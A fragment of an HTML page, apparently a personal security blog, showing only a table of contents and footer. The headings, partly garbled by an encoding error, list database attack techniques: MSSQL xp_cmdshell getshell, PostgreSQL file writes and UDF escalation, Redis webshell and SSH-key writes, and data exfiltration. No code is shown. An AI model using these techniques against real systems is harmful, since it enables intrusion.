class="toc-article-text">MSSQL æƒé™åˆ’åˆ†</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84"><span class="toc-article-text">å¯»æ‰¾çœŸå®è·¯å¾„</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#xp-cmdshell-Get-Shell"><span class="toc-article-text">xp_cmdshell Get Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%97%A5%E5%BF%97%E5%A4%87%E4%BB%BD-Get-Shell-%E6%8E%A8%E8%8D%90"><span class="toc-article-text">æ—¥å¿—å¤‡ä»½ Get Shell[æ¨è]</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD-GetShell"><span class="toc-article-text">å·®å¼‚å¤‡ä»½ GetShell</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MSSQL-%E6%8F%90%E6%9D%83"><span class="toc-article-text">MSSQL ææƒ</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#xp-cmdshell"><span class="toc-article-text">xp_cmdshell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#sp-oacreate"><span class="toc-article-text">sp_oacreate</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-article-text">æ²™ç›’ææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Ole-Automation-Procedures%E6%8F%90%E6%9D%83"><span class="toc-article-text">Ole Automation Proceduresææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JobAgent%E6%8F%90%E6%9D%83"><span class="toc-article-text">JobAgentææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CLR%E6%8F%90%E6%9D%83"><span class="toc-article-text">CLRææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%A7%A6%E5%8F%91%E5%99%A8%E6%8F%90%E6%9D%83"><span class="toc-article-text">è§¦å‘å™¨ææƒ</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-1"><span class="toc-article-text">Other</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-article-text">å¯¼å‡ºæ•°æ®åº“</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9E%E6%8E%A5IP-1"><span class="toc-article-text">è¿æ¥IP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Bypass"><span class="toc-article-text">Bypass</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ORACLE"><span class="toc-article-text">ORACLE</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Oracle-Getshell"><span class="toc-article-text">Oracle Getshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JAVA%E5%87%BD%E6%95%B0%E6%8F%90%E6%9D%83"><span class="toc-article-text">JAVAå‡½æ•°ææƒ</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-2"><span class="toc-article-text">Other</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9E%E6%8E%A5IP-2"><span class="toc-article-text">è¿æ¥IP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6"><span class="toc-article-text">è¯»å–æœåŠ¡ç«¯æ–‡ä»¶</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#POSTGRESQL"><span class="toc-article-text">POSTGRESQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PostgreSQL-GetShell"><span class="toc-article-text">PostgreSQL GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-article-text">ä¿¡æ¯è·å–</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Copy-To-%E5%86%99%E5%85%A5Shell"><span class="toc-article-text">Copy To å†™å…¥Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LO-CREATE%E5%86%99%E5%85%A5Shell"><span class="toc-article-text">LO_CREATEå†™å…¥Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LO-EXPORT%E5%86%99%E5%85%A5Shell"><span class="toc-article-text">LO_EXPORTå†™å…¥Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#lo-export-pg-largeobject"><span class="toc-article-text">lo_export + pg_largeobject</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PostgreSQL%E6%8F%90%E6%9D%83"><span class="toc-article-text">PostgreSQLææƒ</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-article-text">UDFææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PL-Python-%E6%89%A9%E5%B1%95"><span class="toc-article-text">PL&#x2F;Python æ‰©å±•</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2018-1058"><span class="toc-article-text">CVE-2018-1058</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2019-9193"><span class="toc-article-text">CVE-2019-9193</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-3"><span class="toc-article-text">Other</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Pg%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-article-text">Pgè¯»å–æ–‡ä»¶</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PG%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="toc-article-text">PGå¤–å¸¦æ•°æ®</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%97%E4%B8%BE%E7%9B%AE%E5%BD%95"><span class="toc-article-text">åˆ—ä¸¾ç›®å½•</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9E%E6%8E%A5IP-3"><span class="toc-article-text">è¿æ¥IP</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#MongoDB"><span class="toc-article-text">MongoDB</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-4"><span class="toc-article-text">Other</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9E%E6%8E%A5IP-4"><span class="toc-article-text">è¿æ¥IP</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Redis"><span class="toc-article-text">Redis</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Redis-GetShell"><span class="toc-article-text">Redis GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Redis%E5%86%99Webshell"><span class="toc-article-text">Rediså†™Webshell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Redis-%E5%86%99SSH%E5%85%AC%E9%92%A5"><span class="toc-article-text">Redis å†™SSHå…¬é’¥</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell"><span class="toc-article-text">ä¸»ä»å¤åˆ¶GetShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1GetShell"><span class="toc-article-text">è®¡åˆ’ä»»åŠ¡GetShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-article-text">æ²™ç›’é€ƒé€¸</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows-Getshell"><span class="toc-article-text">Windows Getshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E5%86%99%E5%85%A5WebShell"><span class="toc-article-text">Windowså†™å…¥WebShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-article-text">Windowså†™å…¥å¯åŠ¨é¡¹</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-%E5%86%99%E5%85%A5mof"><span class="toc-article-text">Windows å†™å…¥mof</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E4%B8%BB%E4%BB%8E%E5%8A%AB%E6%8C%81DLL"><span class="toc-article-text">Windowsä¸»ä»åŠ«æŒDLL</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-5"><span class="toc-article-text">Other</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9E%E6%8E%A5IP-5"><span class="toc-article-text">è¿æ¥IP</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 hitman's Blog
  
      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
</p>

 </footer>
</div> <!-- container-narrow -->
  



  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
